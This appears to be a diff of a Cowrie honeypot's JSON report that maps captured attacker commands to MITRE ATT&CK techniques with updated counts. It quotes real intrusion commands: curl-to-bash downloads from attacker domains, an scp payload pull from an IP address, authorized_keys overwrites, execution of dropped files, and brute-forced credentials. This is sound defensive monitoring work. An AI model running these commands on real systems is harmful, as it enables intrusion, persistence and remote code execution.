@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-09-24 03:02:39",
+  "generated": "2026-09-24 04:03:45",
   "totals": {
-    "commands": 3251,
-    "login_failed": 1962,
-    "login_success": 994,
-    "sessions": 2113
+    "commands": 3497,
+    "login_failed": 2331,
+    "login_success": 1018,
+    "sessions": 2555
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 1962,
+      "count": 2331,
       "examples": [
         "suser / 123456",
         "antonio / antonio",
@@ -21,14 +21,14 @@
         "root / Pass2024"
       ],
       "first": "2026-09-24T00:00:32.122319Z",
-      "last": "2026-09-24T03:02:38.870317Z",
-      "unique_ips": 34
+      "last": "2026-09-24T03:59:40.963857Z",
+      "unique_ips": 45
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 994,
+      "count": 1018,
       "examples": [
         "root / root",
         "root / mk@123456",
@@ -37,8 +37,8 @@
         "user / user"
       ],
       "first": "2026-09-24T00:04:51.269971Z",
-      "last": "2026-09-24T02:57:30.754206Z",
-      "unique_ips": 25
+      "last": "2026-09-24T03:59:43.774392Z",
+      "unique_ips": 34
     },
     {
       "id": "T1083",
@@ -57,7 +57,7 @@
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 157,
+      "count": 267,
       "examples": [
         ">/var/.f && chmod 777 /var/.f && /var/.f && cd /var/;",
         ">/var/tmp/.f && chmod 777 /var/tmp/.f && /var/tmp/.f && cd /var/tmp/;",
@@ -66,14 +66,14 @@
         ">/dev/shm/.f && chmod 777 /dev/shm/.f && /dev/shm/.f && cd /dev/shm/;"
       ],
       "first": "2026-09-24T00:04:54.092424Z",
-      "last": "2026-09-24T02:49:46.147176Z",
-      "unique_ips": 13
+      "last": "2026-09-24T03:59:45.758083Z",
+      "unique_ips": 19
     },
     {
       "id": "T1082",
       "name": "System Information Discovery",
       "tactic": "Discovery",
-      "count": 35,
+      "count": 38,
       "examples": [
         "cat /proc/cpuinfo | grep name | wc -l",
         "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",
@@ -82,14 +82,30 @@
         "cat /proc/cpuinfo | grep model | grep name | wc -l"
       ],
       "first": "2026-09-24T00:16:03.897652Z",
-      "last": "2026-09-24T02:57:31.097380Z",
-      "unique_ips": 9
+      "last": "2026-09-24T03:35:51.456898Z",
+      "unique_ips": 11
+    },
+    {
+      "id": "T1105",
+      "name": "Ingress Tool Transfer",
+      "tactic": "Command and Control",
+      "count": 11,
+      "examples": [
+        "if ! command -v curl &> /dev/null; then apt-get update -y && apt-get install -y curl || yum install -y curl; fi",
+        "bash <(curl -sL https://raw.githubusercontent.com/komari-monitor/komari-agent/refs/heads/main/install.sh) -e https://sex",
+        "UserKnownHostsFile /dev/null' > sshcfg; chmod 400 key.ppk; scp -s -F sshcfg -i key.ppk dlr@217.60.103.56:sh out_sh; if [",
+        "curl -sL -o /tmp/install.sh https://del.sou.pp.ua/install.sh && bash /tmp/install.sh; rm -f /tmp/install.sh",
+        "mkdir -p /usr/lib/.sysd-scan/tmhome && curl -sL -o /tmp/tm.sh https://del.sou.pp.ua/install_tm.sh && cd /usr/lib/.sysd-s"
+      ],
+      "first": "2026-09-24T00:15:58.081526Z",
+      "last": "2026-09-24T03:52:57.512020Z",
+      "unique_ips": 8
     },
     {
       "id": "T1033",
       "name": "System Owner/User Discovery",
       "tactic": "Discovery",
-      "count": 9,
+      "count": 10,
       "examples": [
         "w",
         "whoami",
@@ -97,21 +113,7 @@
         "id"
       ],
       "first": "2026-09-24T00:16:09.607300Z",
-      "last": "2026-09-24T02:28:45.589509Z",
-      "unique_ips": 6
-    },
-    {
-      "id": "T1105",
-      "name": "Ingress Tool Transfer",
-      "tactic": "Command and Control",
-      "count": 9,
-      "examples": [
-        "if ! command -v curl &> /dev/null; then apt-get update -y && apt-get install -y curl || yum install -y curl; fi",
-        "bash <(curl -sL https://raw.githubusercontent.com/komari-monitor/komari-agent/refs/heads/main/install.sh) -e https://sex",
-        "UserKnownHostsFile /dev/null' > sshcfg; chmod 400 key.ppk; scp -s -F sshcfg -i key.ppk dlr@217.60.103.56:sh out_sh; if ["
-      ],
-      "first": "2026-09-24T00:15:58.081526Z",
-      "last": "2026-09-24T02:28:24.362338Z",
+      "last": "2026-09-24T03:33:59.646923Z",
       "unique_ips": 7
     },
     {
@@ -131,38 +133,39 @@
       "id": "T1098.004",
       "name": "Account Manipulation: SSH Authorized Keys",
       "tactic": "Persistence",
-      "count": 5,
+      "count": 6,
       "examples": [
-        "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1"
+        "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1",
+        "mkdir -p ~/.ssh; chattr -ia ~/.ssh/authorized_keys; echo \"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHQGOxKK322AbGwPqefUy1MUBZ"
       ],
       "first": "2026-09-24T00:15:57.120124Z",
-      "last": "2026-09-24T02:28:24.067782Z",
-      "unique_ips": 5
+      "last": "2026-09-24T03:52:45.993294Z",
+      "unique_ips": 6
     },
     {
       "id": "T1070.004",
       "name": "Indicator Removal: File Deletion",
       "tactic": "Defense Evasion",
-      "count": 3,
+      "count": 4,
       "examples": [
         "rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep",
         "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || "
       ],
       "first": "2026-09-24T00:16:05.314538Z",
-      "last": "2026-09-24T02:13:55.069225Z",
-      "unique_ips": 3
+      "last": "2026-09-24T03:33:59.646923Z",
+      "unique_ips": 4
     },
     {
       "id": "T1059.004",
       "name": "Command and Scripting Interpreter: Unix Shell",
       "tactic": "Execution",
-      "count": 2,
+      "count": 3,
       "examples": [
         "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || "
       ],
       "first": "2026-09-24T00:18:43.310889Z",
-      "last": "2026-09-24T02:13:55.069225Z",
-      "unique_ips": 2
+      "last": "2026-09-24T03:33:59.646923Z",
+      "unique_ips": 3
     },
     {
       "id": "T1087.001",
@@ -192,31 +195,31 @@
   "unmapped": [
     [
       "sh",
-      966
+      984
     ],
     [
       "system",
-      966
+      984
     ],
     [
       "/bin/busybox HISILICON",
-      36
+      63
     ],
     [
       "shell",
-      28
+      46
     ],
     [
       "enable",
-      25
+      43
     ],
     [
       "ping; sh",
-      24
+      42
     ],
     [
       "/bin/busybox cat /proc/self/exe || cat /proc/self/exe",
-      12
+      21
     ],
     [
       "zalee",
